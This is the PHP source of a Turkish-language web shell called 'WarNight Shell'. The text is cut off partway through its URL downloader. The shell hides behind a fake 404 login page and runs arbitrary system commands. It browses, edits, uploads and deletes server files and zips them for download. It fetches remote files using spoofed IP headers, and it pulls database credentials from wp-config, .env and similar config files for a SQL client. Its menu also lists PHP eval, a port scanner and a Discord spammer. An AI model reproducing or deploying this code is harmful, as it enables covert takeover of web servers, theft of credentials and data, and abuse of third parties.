<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
header('X-XSS-Protection: 0');
define('PASSWORD_HASH', "fd41ac418cc86aade915a32c573adfd2"); // Parola: warnight

function get_param($name, $default = null) {
    return isset($_REQUEST[$name]) ? base64_decode($_REQUEST[$name]) : $default;
}

function create_url($page, $dir, $params = []) {
    $url_params = [];
    if ($page) $url_params['p'] = base64_encode($page);
    if ($dir) $url_params['dir'] = base64_encode($dir);
    foreach ($params as $key => $value) $url_params[$key] = base64_encode($value);
    return '?' . http_build_query($url_params);
}

function generate_random_ip() {
    return rand(1, 254) . "." . rand(0, 255) . "." . rand(0, 255) . "." . rand(1, 254);
}

function get_anon_headers() {
    $ip = generate_random_ip();
    return [
        "X-Forwarded-For: $ip", "X-Real-IP: $ip", "Client-Ip: $ip", "True-Client-IP: $ip"
    ];
}

function exec_command($cmd) {
    $output = '';
    if (function_exists('system')) {
        ob_start(); system($cmd . ' 2>&1'); $output = ob_get_contents(); ob_end_clean();
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('passthru')) {
        ob_start(); passthru($cmd . ' 2>&1'); $output = ob_get_contents(); ob_end_clean();
    } elseif (function_exists('exec')) {
        $lines = []; exec($cmd . ' 2>&1', $lines); $output = implode("\n", $lines);
    } else {
        return "Komut çalıştırma fonksiyonları bu sunucuda devre dışı bırakılmış.";
    }
    if (empty($output)) {
        return "Komut çalıştırıldı ancak hiçbir çıktı vermedi.";
    }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($output, 'UTF-8', 'auto') : $output;
}

function format_bytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function get_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function render_directory_tree($path, $level = 0, $max_level = 2) {
    if ($level > $max_level || !is_readable($path)) return;
    $files = @scandir($path);
    if (!$files) return;
    $indent = str_repeat('&nbsp;&nbsp;&nbsp;&nbsp;', $level);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $full_path = $path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($full_path)) {
            echo $indent . '&#128193; ' . htmlspecialchars($file) . "<br>";
            render_directory_tree($full_path, $level + 1, $max_level);
        }
    }
}

function find_db_creds($path) {
    $creds = [];
    $config_files = ['wp-config.php', 'configuration.php', 'config.php', 'settings.php', 'database.php', '.env', 'local.xml'];
    
    foreach ($config_files as $config_file) {
        $file_path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $config_file;
        if (file_exists($file_path) && is_readable($file_path)) {
            $content = file_get_contents($file_path);
            if (preg_match("/(?:define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]|'host'\s*=>\s*'|DB_HOST=)([^'\"]+)/", $content, $host)) $creds['host'] = $host[1];
            if (preg_match("/(?:define\s*\(\s*['\"]DB_USER(?:NAME)?['\"]\s*,\s*['\"]|'username'\s*=>\s*'|DB_USERNAME=)([^'\"]+)/", $content, $user)) $creds['user'] = $user[1];
            if (preg_match("/(?:define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]|'password'\s*=>\s*'|DB_PASSWORD=)([^'\"]*)/", $content, $pass)) $creds['pass'] = $pass[1];
            if (preg_match("/(?:define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]|'database'\s*=>\s*'|DB_DATABASE=)([^'\"]+)/", $content, $name)) $creds['db'] = $name[1];
            if (preg_match("/<host><!\[CDATA\[([^\]]+)\]\]><\/host>/", $content, $host)) $creds['host'] = $host[1];
            if (preg_match("/<username><!\[CDATA\[([^\]]+)\]\]><\/username>/", $content, $user)) $creds['user'] = $user[1];
            if (preg_match("/<password><!\[CDATA\[([^\]]+)\]\]><\/password>/", $content, $pass)) $creds['pass'] = $pass[1];
            if (preg_match("/<dbname><!\[CDATA\[([^\]]+)\]\]><\/dbname>/", $content, $name)) $creds['db'] = $name[1];
            if (!empty($creds['host']) && !empty($creds['user']) && !empty($creds['db'])) return $creds;
        }
    }
    return null;
}

function zip_directory($source, $destination) {
    if (!extension_loaded('zip') || !file_exists($source)) return false;
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) return false;
    $source = str_replace('\\', '/', realpath($source));
    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = str_replace('\\', '/', $file);
            if (in_array(substr($file, strrpos($file, '/') + 1), ['.', '..'])) continue;
            $file = realpath($file);
            if (is_dir($file)) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } else if (is_file($file)) {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    } else if (is_file($source)) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }
    return $zip->close();
}

if (isset($_GET['zip_dir'])) {
    $dir_to_zip = get_param('zip_dir');
    if (is_dir($dir_to_zip)) {
        $zip_file = sys_get_temp_dir() . '/' . uniqid('WarNight_') . '.zip';
        if (zip_directory($dir_to_zip, $zip_file)) {
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . basename($dir_to_zip) . '.zip"');
            header('Content-Length: ' . filesize($zip_file));
            readfile($zip_file);
            @unlink($zip_file);
            exit;
        }
    }
}

if (isset($_POST['password'])) {
    if (md5($_POST['password']) === PASSWORD_HASH) {
        $_SESSION['authenticated'] = true;
    } else {
        echo "<script>alert('Parola yanlış, dostum!');</script>";
    }
}

if (isset($_GET['download'])) {
    $file_path = get_param('download');
    if (file_exists($file_path) && is_readable($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

if (!isset($_SESSION['authenticated'])) {
    header('HTTP/1.0 404 Not Found');
    echo <<<HTML
<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'><title>404 Not Found</title><style>body{background-color:#000;color:#fff;font-family:'Courier New',monospace;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;cursor:url('https://png.pngtree.com/png-vector/20240314/ourmid/pngtree-skull-t-shirt-prints-isolated-png-image_11963940.png') 16 16,auto;}.login-box{background-color:#161b22;border:1px solid #30363d;border-radius:8px;padding:40px;text-align:center;}.login-box h1{color:#8a2be2;font-size:2rem;text-shadow:0 0 5px #ffd700;}.login-box input[type="password"]{background-color:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px;border-radius:5px;font-family:'Courier New',monospace;margin-top:15px;width:250px;}.login-box input[type="submit"]{background-color:#8a2be2;color:white;border:none;padding:12px 20px;border-radius:5px;cursor:url('https://png.pngtree.com/png-vector/20240314/ourmid/pngtree-skull-t-shirt-prints-isolated-png-image_11963940.png') 16 16,auto;margin-top:15px;font-weight:bold;transition:background-color 0.3s ease;}.login-box input[type="submit"]:hover{background-color:#6a0dad;}</style></head><body><div class='login-box'><h1>WarNight Shell</h1><form method='post'><input type='password' name='password' placeholder='Password...' required><input type='submit' value='Giriş Yap'></form></div></body></html>
HTML;
    exit();
}

$current_page = get_param('p', 'dashboard');
$current_dir = realpath(get_param('dir', getcwd()));
if (!$current_dir || !is_dir($current_dir)) $current_dir = getcwd();

header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WarNight Shell</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');
        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Roboto Mono', monospace; margin: 0; padding: 0; cursor: url('https://png.pngtree.com/png-vector/20240314/ourmid/pngtree-skull-t-shirt-prints-isolated-png-image_11963940.png') 16 16, auto; }
        .container { display: flex; min-height: 100vh; }
        .sidebar { width: 250px; background-color: #161b22; padding: 20px; border-right: 1px solid #30363d; box-shadow: 2px 0 5px rgba(0,0,0,0.5); position: sticky; top: 0; height: 100vh; overflow-y: auto; }
        .sidebar h1 { color: #8a2be2; text-shadow: 0 0 5px #ffd700; font-size: 1.5rem; text-align: center; margin-bottom: 30px; }
        .sidebar ul { list-style: none; padding: 0; margin: 0; }
        .sidebar li { margin-bottom: 10px; }
        .sidebar a { display: block; padding: 10px 15px; color: #c9d1d9; text-decoration: none; border-radius: 5px; transition: all 0.3s ease; font-weight: bold; }
        .sidebar a:hover { background-color: #30363d; color: #ffd700; box-shadow: 0 0 5px #ffd700; }
        .sidebar a.active { background-color: #21262d; border-left: 3px solid #8a2be2; color: #8a2be2; font-weight: bold; }
        .content { flex-grow: 1; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .pwd-bar { background-color: #21262d; border: 1px solid #30363d; border-radius: 8px; padding: 10px 15px; flex-grow: 1; display: flex; flex-wrap: wrap; align-items: center; font-weight: bold; color: #fff; }
        .pwd-bar a { color: #fff; text-decoration: none; }
        .pwd-bar a:hover { color: #ffd700; }
        .pwd-bar span { margin: 0 5px; color: #8a2be2; }
        .profile-pic { width: 50px; height: 50px; border-radius: 50%; border: 2px solid #8a2be2; margin-left: 20px; cursor: pointer; }
        .module { background-color: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .module h2 { color: #8a2be2; border-bottom: 1px solid #30363d; padding-bottom: 10px; margin-top: 0; }
        .module .description { font-style: italic; color: #8b949e; margin-top: -5px; margin-bottom: 15px; font-size: 0.9em; }
        .module pre { background-color: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; overflow-x: auto; }
        .module form { display: flex; flex-direction: column; gap: 15px; }
        .module input, .module textarea, .module select { width: 100%; box-sizing: border-box; background-color: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 10px; border-radius: 5px; font-family: 'Roboto Mono', monospace; resize: vertical; }
        .module input[type="file"] { padding: 5px; }
        .module input[type="submit"], .module button { width: auto; align-self: flex-start; background-color: #8a2be2; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: url('https://png.pngtree.com/png-vector/20240314/ourmid/pngtree-skull-t-shirt-prints-isolated-png-image_11963940.png') 16 16, auto; transition: background-color 0.3s ease; font-weight: bold; }
        .module input[type="submit"]:hover, .module button:hover { background-color: #6a0dad; }
        .table { width: 100%; border-collapse: collapse; }
        .table th, .table td { padding: 12px; text-align: left; border-bottom: 1px solid #30363d; }
        .table th { background-color: #21262d; }
        .table a { color: #58a6ff; text-decoration: none; }
        .table a:hover { color: #ffd700; text-decoration: underline; }
        .table .actions a { margin: 0 5px; color: #c9d1d9; font-size: 1.1rem; }
        .status-message { padding: 15px; border-radius: 5px; margin: 15px 0; font-weight: bold; }
        .status-success { background-color: #238636; color: white; }
        .status-error { background-color: #da3633; color: white; }
        .status-info { background-color: #1f6feb; color: white; }
        iframe { border: 1px solid #30363d; width: 100%; height: 80vh; background-color: #0d1117; }
    </style>
</head>
<body>
<div class="container">
    <div class="sidebar">
        <h1>WarNight Shell</h1>
        <ul>
            <li><a href="<?= create_url('dashboard', $current_dir) ?>" class="<?= $current_page == 'dashboard' ? 'active' : '' ?>"><i class="bi bi-house-door"></i> Anasayfa</a></li>
            <li><a href="<?= create_url('command', $current_dir) ?>" class="<?= $current_page == 'command' ? 'active' : '' ?>"><i class="bi bi-terminal"></i> Komut Çalıştır</a></li>
            <li><a href="<?= create_url('files', $current_dir) ?>" class="<?= $current_page == 'files' ? 'active' : '' ?>"><i class="bi bi-folder2-open"></i> Dosya Yöneticisi</a></li>
            <li><a href="<?= create_url('editor', $current_dir) ?>" class="<?= $current_page == 'editor' ? 'active' : '' ?>"><i class="bi bi-file-earmark-text"></i> Metin Düzenleyici</a></li>
            <li><a href="<?= create_url('createfile', $current_dir) ?>" class="<?= $current_page == 'createfile' ? 'active' : '' ?>"><i class="bi bi-file-plus"></i> Belge Oluştur</a></li>
            <li><a href="<?= create_url('upload', $current_dir) ?>" class="<?= $current_page == 'upload' ? 'active' : '' ?>"><i class="bi bi-cloud-upload"></i> Dosya Yükle</a></li>
            <li><a href="<?= create_url('sqlclient', $current_dir) ?>" class="<?= $current_page == 'sqlclient' ? 'active' : '' ?>"><i class="bi bi-database"></i> SQL İstemcisi</a></li>
            <li><a href="<?= create_url('hashgenerator', $current_dir) ?>" class="<?= $current_page == 'hashgenerator' ? 'active' : '' ?>"><i class="bi bi-hash"></i> Hash Üretici</a></li>
            <li><a href="<?= create_url('urldownloader', $current_dir) ?>" class="<?= $current_page == 'urldownloader' ? 'active' : '' ?>"><i class="bi bi-link"></i> URL'den Yükle</a></li>
            <li><a href="<?= create_url('phpeval', $current_dir) ?>" class="<?= $current_page == 'phpeval' ? 'active' : '' ?>"><i class="bi bi-filetype-php"></i> PHP Değerlendir</a></li>
            <li><a href="<?= create_url('mail', $current_dir) ?>" class="<?= $current_page == 'mail' ? 'active' : '' ?>"><i class="bi bi-envelope"></i> Mail Gönder</a></li>
            <li><a href="<?= create_url('portscan', $current_dir) ?>" class="<?= $current_page == 'portscan' ? 'active' : '' ?>"><i class="bi bi-broadcast"></i> Port Tarayıcı</a></li>
            <li><a href="<?= create_url('proxy', $current_dir) ?>" class="<?= $current_page == 'proxy' ? 'active' : '' ?>"><i class="bi bi-globe"></i> Web Tarayıcı</a></li>
            <li><a href="<?= create_url('domaininfo', $current_dir) ?>" class="<?= $current_page == 'domaininfo' ? 'active' : '' ?>"><i class="bi bi-info-circle"></i> Domain Bilgisi</a></li>
            <li><a href="<?= create_url('base64', $current_dir) ?>" class="<?= $current_page == 'base64' ? 'active' : '' ?>"><i class="bi bi-code-square"></i> Base64 Çevirici</a></li>
            <li><a href="<?= create_url('discord', $current_dir) ?>" class="<?= $current_page == 'discord' ? 'active' : '' ?>"><i class="bi bi-discord"></i> Discord Spammer</a></li>
        </ul>
    </div>
    <div class="content">
        <div class="header">
            <div class="pwd-bar">
                <span>Konum:</span>
                <?php
                $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
                $path_so_far = '';
                foreach ($path_parts as $i => $part) {
                    if ($part === '' && $i === 0) {
                        $path_so_far = DIRECTORY_SEPARATOR;
                        echo "<a href='" . create_url('files', $path_so_far) . "'>/</a>";
                        continue;
                    }
                    if ($part !== '') {
                       $path_so_far = implode(DIRECTORY_SEPARATOR, array_slice($path_parts, 0, $i + 1));
                       if(empty($path_so_far) && DIRECTORY_SEPARATOR === '\\') $path_so_far = $part . '\\';
                       echo "<a href='" . create_url('files', $path_so_far) . "'>" . htmlspecialchars($part) . "</a><span>/</span>";
                    }
                }
                ?>
            </div>
            <img src="https://cdn.discordapp.com/icons/1278650423393128520/0e4d9e67d8f7d17dba3cf7af29ebf47a.webp" alt="Profile" id="profilePic" class="profile-pic">
        </div>
        <?php
        switch ($current_page) {
            case 'dashboard':
                $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
                $server_info = [
                    'Sunucu Yazılımı' => $_SERVER['SERVER_SOFTWARE'],
                    'Sunucu IP' => $_SERVER['SERVER_ADDR'] ?? exec_command($is_windows ? 'ipconfig | findstr /i "ipv4"' : 'hostname -i'),
                    'PHP Sürümü' => phpversion(),
                    'İşletim Sistemi' => php_uname(),
                    'Mevcut Kullanıcı' => function_exists('get_current_user') ? get_current_user() : exec_command('whoami'),
                ];
                $disk_usage = [
                    'Kullanılan Alan' => format_bytes(disk_total_space(".") - disk_free_space(".")),
                    'Toplam Alan' => format_bytes(disk_total_space(".")),
                ];

                echo "<div class='module'><h2><i class='bi bi-info-circle'></i> Sunucu Bilgileri</h2><p class='description'>Sunucu hakkında genel bilgiler.</p><pre>";
                foreach($server_info as $key => $val) echo "<strong>$key:</strong> " . htmlspecialchars(trim($val)) . "\n";
                foreach($disk_usage as $key => $val) echo "<strong>$key:</strong> " . htmlspecialchars($val) . "\n";
                echo "</pre></div>";

                echo "<div class='module'><h2><i class='bi bi-diagram-3'></i> Dizin Ağacı</h2><p class='description'>Mevcut dizinin altındaki dallanmalar.</p><pre>";
                render_directory_tree($current_dir);
                echo "</pre></div>";
                break;

            case 'command':
                echo "<div class='module'><h2><i class='bi bi-terminal'></i> Komut Çalıştırıcı</h2><p class='description'>Sunucuya komut gönderin.</p>";
                echo "<form method='post' action='" . create_url('command', $current_dir) . "'>";
                echo "<label for='cmd'>Komut</label>";
                echo "<input type='text' name='cmd' id='cmd' placeholder='ls -la' required>";
                echo "<input type='submit' name='submit' value='Çalıştır'>";
                echo "</form>";
                if (isset($_POST['cmd'])) {
                    echo "<h3>Çıktı</h3><pre>" . htmlspecialchars(exec_command($_POST['cmd'])) . "</pre>";
                }
                echo "</div>";
                break;

            case 'files':
                echo "<div class='module'><h2><i class='bi bi-folder2-open'></i> Dosya Yöneticisi</h2><p class='description'>Dosyaları ve dizinleri yönetin.</p>";
                if (isset($_GET['delete'])) {
                    $item_to_delete = get_param('delete');
                    if (is_file($item_to_delete)) { if(@unlink($item_to_delete)) echo "<div class='status-message status-success'>Dosya başarıyla silindi.</div>"; }
                    elseif (is_dir($item_to_delete)) { if(@rmdir($item_to_delete)) echo "<div class='status-message status-success'>Dizin başarıyla silindi.</div>"; else echo "<div class='status-message status-error'>Dizin boş değil, önce içini boşaltın.</div>";}
                }
                if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
                     if (@rename($_POST['rename_old'], $_POST['rename_new'])) echo "<div class='status-message status-success'>Başarıyla yeniden adlandırıldı.</div>";
                     else echo "<div class='status-message status-error'>Yeniden adlandırma başarısız.</div>";
                }
                echo "<p><a href='" . create_url('files', dirname($current_dir)) . "'><i class='bi bi-arrow-return-left'></i> Üst Dizin</a></p>";
                echo "<table class='table'><thead><tr><th>Ad</th><th>Boyut</th><th>Yetki</th><th>İşlemler</th></tr></thead><tbody>";
                $files = scandir($current_dir);
                foreach ($files as $file) {
                    if ($file == '.' || $file == '..') continue;
                    $path = $current_dir . DIRECTORY_SEPARATOR . $file;
                    $is_dir = is_dir($path);
                    $icon = $is_dir ? '<i class="bi bi-folder-fill" style="color: #58a6ff;"></i>' : '<i class="bi bi-file-earmark-text"></i>';
                    echo "<tr><td>$icon <a href='" . ($is_dir ? create_url('files', $path) : create_url('editor', $current_dir, ['file' => $path])) . "'>" . htmlspecialchars($file) . "</a></td><td>" . ($is_dir ? '-' : format_bytes(filesize($path))) . "</td><td>" . get_permissions($path) . "</td><td class='actions'>";
                    if ($is_dir) echo "<a href='" . create_url('files', $current_dir, ['zip_dir' => $path]) . "' title='Dizini İndir (ZIP)'><i class='bi bi-file-earmark-zip'></i></a>";
                    else echo "<a href='" . create_url('files', $current_dir, ['download' => $path]) . "' title='İndir'><i class='bi bi-download'></i></a>";
                    echo "<a href='#' onclick=\"var n=prompt('Yeni ad:','".htmlspecialchars($file)."');if(n){var f=document.createElement('form');f.method='POST';f.action='".create_url('files',$current_dir)."';f.innerHTML=`<input type=hidden name=rename_old value=\'".htmlspecialchars($path)."\'><input type=hidden name=rename_new value=\'".htmlspecialchars($current_dir.DIRECTORY_SEPARATOR)."${n}\'>`;document.body.appendChild(f);f.submit();}\" title='Yeniden Adlandır'><i class='bi bi-pencil-square'></i></a>";
                    echo "<a href='" . create_url('files', $current_dir, ['delete' => $path]) . "' title='Sil' onclick=\"return confirm('Emin misin?');\"><i class='bi bi-trash'></i></a></td></tr>";
                }
                echo "</tbody></table></div>";
                break;
            
            case 'createfile':
                echo "<div class='module'><h2><i class='bi bi-file-plus'></i> Belge Oluştur</h2><p class='description'>Yeni bir dosya oluşturun.</p>";
                if (isset($_POST['file_name']) && isset($_POST['file_content'])) {
                    $new_file_path = $current_dir . DIRECTORY_SEPARATOR . $_POST['file_name'];
                    if (file_exists($new_file_path)) {
                        echo "<div class='status-message status-error'>Bu isimde bir dosya zaten var.</div>";
                    } elseif (@file_put_contents($new_file_path, $_POST['file_content']) !== false) {
                        echo "<div class='status-message status-success'>Dosya başarıyla oluşturuldu: " . htmlspecialchars($new_file_path) . "</div>";
                    } else {
                        echo "<div class='status-message status-error'>Dosya oluşturulurken bir hata oluştu. İzinleri kontrol edin.</div>";
                    }
                }
                echo "<form method='post' action='" . create_url('createfile', $current_dir) . "'>";
                echo "<label for='file_name'>Dosya Adı</label><input type='text' name='file_name' id='file_name' placeholder='yeni_dosya.php' required>";
                echo "<label for='file_content'>Dosya İçeriği</label><textarea name='file_content' id='file_content' rows='15' placeholder='<?php phpinfo(); ?>'></textarea>";
                echo "<label for='user_agent'>User-Agent (İsteğe Bağlı)</label><input type='text' name='user_agent' placeholder='(Bu özellik URLden Yükle içindir)'>";
                echo "<label for='mime_type'>MIME Type (İsteğe Bağlı)</label><input type='text' name='mime_type' placeholder='(Bu özellik URLden Yükle içindir)'>";
                echo "<label for='custom_headers'>Özel Headerlar (Her biri yeni satırda)</label><textarea name='custom_headers' rows='3' placeholder='(Bu özellik URLden Yükle içindir)'></textarea>";
                echo "<input type='submit' value='Oluştur'></form></div>";
                break;

            case 'editor':
                echo "<div class='module'><h2><i class='bi bi-file-earmark-text'></i> Metin Düzenleyici</h2><p class='description'>Dosyaların içeriğini düzenleyin.</p>";
                $file = get_param('file');
                if (isset($_POST['file_path']) && isset($_POST['file_content'])) {
                    if (@file_put_contents($_POST['file_path'], $_POST['file_content']) !== false) echo "<div class='status-message status-success'>Dosya başarıyla kaydedildi.</div>";
                    else echo "<div class='status-message status-error'>Dosya kaydedilirken bir hata oluştu.</div>";
                }
                $file_content = ''; if (!empty($file) && is_file($file)) $file_content = @file_get_contents($file);
                echo "<form method='post' action='" . create_url('editor', $current_dir, ['file' => $file]) . "'>";
                echo "<label for='file_path'>Dosya Yolu</label><input type='text' name='file_path' id='file_path' value='" . htmlspecialchars($file) . "' required>";
                echo "<label for='file_content'>Dosya İçeriği</label><textarea name='file_content' id='file_content' rows='20'>" . htmlspecialchars($file_content) . "</textarea>";
                echo "<input type='submit' value='Kaydet'></form></div>";
                break;

            case 'upload':
                echo "<div class='module'><h2><i class='bi bi-cloud-upload'></i> Dosya Yükle</h2><p class='description'>Bilgisayarınızdan sunucuya dosya yükleyin.</p>";
                if (isset($_FILES['file_to_upload'])) {
                    $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES["file_to_upload"]["name"]);
                    if (move_uploaded_file($_FILES["file_to_upload"]["tmp_name"], $target_file)) echo "<div class='status-message status-success'>Dosya başarıyla yüklendi: " . htmlspecialchars($target_file) . "</div>";
                    else echo "<div class='status-message status-error'>Dosya yüklenirken bir hata oluştu.</div>";
                }
                echo "<form method='post' enctype='multipart/form-data' action='" . create_url('upload', $current_dir) . "'>";
                echo "<label for='file_to_upload'>Yüklenecek Dosya</label><input type='file' name='file_to_upload' id='file_to_upload' required>";
                echo "<label for='user_agent'>User-Agent (İsteğe Bağlı)</label><input type='text' name='user_agent' placeholder='(Bu özellik URLden Yükle içindir)'>";
                echo "<label for='mime_type'>MIME Type (İsteğe Bağlı)</label><input type='text' name='mime_type' placeholder='(Bu özellik URLden Yükle içindir)'>";
                echo "<label for='custom_headers'>Özel Headerlar (Her biri yeni satırda)</label><textarea name='custom_headers' rows='3' placeholder='(Bu özellik URLden Yükle içindir)'></textarea>";
                echo "<input type='submit' value='Yükle'></form></div>";
                break;
            
            case 'sqlclient':
                echo "<div class='module'><h2><i class='bi bi-database'></i> SQL İstemcisi</h2><p class='description'>Veritabanına bağlanın ve sorgu çalıştırın.</p>";
                if (isset($_POST['db_disconnect'])) {
                    unset($_SESSION['db_creds']);
                    echo "<div class='status-message status-info'>Veritabanı bağlantısı kesildi.</div>";
                }
                if (isset($_POST['db_host'])) {
                    $conn_test = @new mysqli($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
                    if ($conn_test->connect_error) {
                        echo "<div class='status-message status-error'>Bağlantı Hatası: " . htmlspecialchars($conn_test->connect_error) . "</div>";
                        unset($_SESSION['db_creds']);
                    } else {
                        $_SESSION['db_creds'] = ['host' => $_POST['db_host'], 'user' => $_POST['db_user'], 'pass' => $_POST['db_pass'], 'db' => $_POST['db_name']];
                        echo "<div class='status-message status-success'>Veritabanı bağlantısı başarıyla kuruldu.</div>";
                        $conn_test->close();
                    }
                }
                if (!isset($_SESSION['db_creds'])) {
                    $creds = find_db_creds($current_dir);
                    echo "<h3>Bağlantı Kur</h3>";
                    if ($creds) echo "<div class='status-message status-info'>Config dosyalarından olası veritabanı bilgileri bulundu.</div>";
                    echo "<form method='post' action='".create_url('sqlclient', $current_dir)."'>";
                    echo "<label>Host</label><input type='text' name='db_host' value='".htmlspecialchars($creds['host'] ?? 'localhost')."'>";
                    echo "<label>Kullanıcı</label><input type='text' name='db_user' value='".htmlspecialchars($creds['user'] ?? 'root')."'>";
                    echo "<label>Parola</label><input type='password' name='db_pass' value='".htmlspecialchars($creds['pass'] ?? '')."'>";
                    echo "<label>Veritabanı</label><input type='text' name='db_name' value='".htmlspecialchars($creds['db'] ?? '')."'>";
                    echo "<input type='submit' value='Bağlan'>";
                    echo "</form>";
                } else {
                    $creds = $_SESSION['db_creds'];
                    echo "<h3>Bağlantı Aktif: ".htmlspecialchars($creds['user'])."@".htmlspecialchars($creds['host'])."</h3>";
                    echo "<form method='post' action='".create_url('sqlclient', $current_dir)."' style='display:inline-block;'><input type='hidden' name='db_disconnect' value='1'><input type='submit' value='Bağlantıyı Kes'></form>";
                    $conn = @new mysqli($creds['host'], $creds['user'], $creds['pass'], $creds['db']);
                    if ($conn->connect_error) {
                        echo "<div class='status-message status-error'>Bağlantı koptu: " . $conn->connect_error . "</div>";
                        unset($_SESSION['db_creds']);
                    } else {
                        if (isset($_POST['sql_query'])) {
                            echo "<h3>Sorgu Sonucu</h3>";
                            $query = $_POST['sql_query'];
                            $result = $conn->query($query);
                            if (!$result) {
                                echo "<div class='status-message status-error'>Sorgu Hatası: " . htmlspecialchars($conn->error) . "</div>";
                            } elseif ($result instanceof mysqli_result) {
                                if ($result->num_rows > 0) {
                                    echo "<table class='table'><thead><tr>";
                                    $fields = $result->fetch_fields();
                                    foreach ($fields as $field) echo "<th>" . htmlspecialchars($field->name) . "</th>";
                                    echo "</tr></thead><tbody>";
                                    while ($row = $result->fetch_assoc()) {
                                        echo "<tr>";
                                        foreach ($row as $data) echo "<td>" . htmlspecialchars($data) . "</td>";
                                        echo "</tr>";
                                    }
                                    echo "</tbody></table>";
                                } else {
                                    echo "<div class='status-message status-info'>Sorgu başarılı, ancak hiç satır döndürmedi.</div>";
                                }
                                $result->close();
                            } else {
                                echo "<div class='status-message status-success'>Sorgu başarılı. Etkilenen satır sayısı: " . $conn->affected_rows . "</div>";
                            }
                        }
                        echo "<h3>Yeni Sorgu</h3>";
                        echo "<form method='post' action='".create_url('sqlclient', $current_dir)."'>";
                        echo "<label for='sql_query'>SQL Sorgusu</label><textarea name='sql_query' id='sql_query' rows='5' placeholder='SELECT * FROM users' required></textarea>";
                        echo "<input type='submit' value='Çalıştır'>";
                        echo "</form>";
                        $conn->close();
                    }
                }
                break;

            case 'hashgenerator':
                echo "<div class='module'><h2><i class='bi bi-hash'></i> Hash Üretici</h2><p class='description'>Metinleri istediğiniz algoritmaya göre şifreleyin.</p>";
                $hash_algos = hash_algos();
                if (isset($_POST['hash_text'])) {
                    $text = $_POST['hash_text']; $algo = $_POST['hash_algo'];
                    if (in_array($algo, $hash_algos)) {
                        $hash = hash($algo, $text);
                        echo "<h3>Sonuç (".htmlspecialchars($algo).")</h3><pre>" . htmlspecialchars($hash) . "</pre>";
                    }
                }
                echo "<form method='post' action='".create_url('hashgenerator', $current_dir)."'>";
                echo "<label for='hash_text'>Metin</label><textarea name='hash_text' id='hash_text' rows='3' required></textarea>";
                echo "<label for='hash_algo'>Algoritma</label><select name='hash_algo' id='hash_algo'>";
                foreach ($hash_algos as $algo) echo "<option value='".htmlspecialchars($algo)."'>".strtoupper($algo)."</option>";
                echo "</select><input type='submit' value='Üret'></form></div>";
                break;

            case 'urldownloader':
                echo "<div class='module'><h2><i class='bi bi-link'></i> URL'den Dosya Yükle</h2><p class='description'>Bir adresteki dosyayı sunucuya çekin.</p>";
                if (isset($_POST['file_url'])) {
                    $file_url = $_POST['file_url'];
                    $dest_path = $current_dir . DIRECTORY_SEPARATOR . basename($file_url);
                    $ch = curl_init($file_url);
                    $fp = fopen($dest_path, 'w+');
                    $headers = get_anon_headers();
                    if(!empty($_POST['user_agent'])) curl_setopt($ch, CURLOPT_USERAGENT, $_POST['user_agent']);
                    if(!empty($_POST['mime_type'])) $headers[] = "Accept: " . $_POST['mime_type'];
                    if(!empty($_POST['custom_headers'])) {
                        $custom_headers = explode("\n", $_POST['custom_headers']);
                        $headers = array_merge($headers, array_map('trim', $custom_headers));
                    }
                    curl_setopt_array($ch, [CURLOPT_FILE => $fp, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 60, CURLOPT_HTTPHEADER => $headers]);
                    if (curl_exec($ch)) echo "<div class='status-message status-success'>Dosya başarıyla indirildi ve kaydedildi.</div>";
